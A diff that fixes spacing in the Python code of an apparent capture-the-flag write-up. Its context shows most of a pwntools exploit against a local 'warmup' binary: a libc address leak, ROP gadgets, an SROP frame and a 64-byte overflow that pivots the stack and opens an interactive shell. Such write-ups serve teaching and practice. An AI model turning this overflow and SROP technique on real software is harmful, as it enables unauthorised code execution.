@@ -69,7 +69,7 @@ srop = p64(pop_rax + offset) + p64(0xf) + p64(syscall + offset) + bytes(frame)
 And now all I must do is pivot the stack into `name` with the overflow.
 
 ``` python
-target_buf_start = p64 (0x404060)
+target_buf_start = p64(0x404060)
 
 overflow = b"A"*64 + target_buf_start + pop_rsp + target_buf_start
 ```
@@ -80,8 +80,8 @@ overflow = b"A"*64 + target_buf_start + pop_rsp + target_buf_start
 from pwn import *
 
 io = process ("./warmup")
-file = context.binary = ELF ("./warmup")
-libc = ELF ("/lib/x86_64-linux-gnu/libc.so.6")
+file = context.binary = ELF("./warmup")
+libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
 
 
 # GADGETS
@@ -89,10 +89,10 @@ libc = ELF ("/lib/x86_64-linux-gnu/libc.so.6")
 rop = ROP(libc)
 
 puts = io.recvuntil(b"\n")
-puts = int (puts, 16)
+puts = int(puts, 16)
 offset = puts - libc.symbols["puts"]
 
-pop_rsp = p64 (0x40118e) # push rbp ; mov rbp, rsp ; pop rsp ; ret
+pop_rsp = p64(0x40118e) # push rbp ; mov rbp, rsp ; pop rsp ; ret
 pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
 syscall = rop.find_gadget(["syscall"])[0]
 pop_rax = rop.find_gadget(["pop rax", "ret"])[0]
@@ -113,12 +113,12 @@ srop = p64(pop_rax + offset) + p64(0xf) + p64(syscall + offset) + bytes(frame)
 
 # PIVOT SECTION
 
-target_buf_start = p64 (0x404060)
+target_buf_start = p64(0x404060)
 
 overflow = b"A"*64 + target_buf_start + pop_rsp + target_buf_start
 
 io.sendline(srop)
-io.sendline (overflow)
+io.sendline(overflow)
 
 io.interactive()
 ```
